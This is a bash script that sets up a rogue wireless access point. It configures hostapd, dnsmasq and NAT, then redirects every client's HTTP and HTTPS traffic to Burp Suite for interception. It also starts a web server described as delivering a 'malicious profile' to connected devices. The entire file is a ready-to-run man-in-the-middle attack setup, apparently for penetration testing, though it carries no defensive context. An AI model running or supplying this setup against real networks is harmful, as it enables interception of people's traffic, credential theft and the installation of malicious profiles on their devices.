#!/bin/bash

echo "Kill any process that might use our wlan..."
airmon-ng check kill
echo "Starting dnsmasq server..."
service dnsmasq restart
echo "Bringing the wireless network up..."
ifconfig wlan0 up
echo "Setting the wifi gateway ip address..."
ifconfig wlan0 10.0.0.1/24
echo "Flushing iptables..."
iptables -t nat -F
iptables -F
echo "Setting up NAT for forwarding..."
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
echo "Enable forwarding at the OS level..."
echo '1' > /proc/sys/net/ipv4/ip_forward
#airmon-ng check kill
echo "Starting hostapd server..."
service hostapd restart
eth0ip=`ifconfig eth0 | grep "inet addr" | cut -d ':' -f 2 | cut -d ' ' -f 1`
echo "Detected eth0 web server ip as  $eth0ip"
echo "Redirecting http(s) traffic to Burpsuite..."
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination $eth0ip:8080
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to-destination $eth0ip:8080
echo "Starting local webserver to deliver malicious profile..."
service apache2 restart
echo "Starting Burpsuite..."
burpsuite



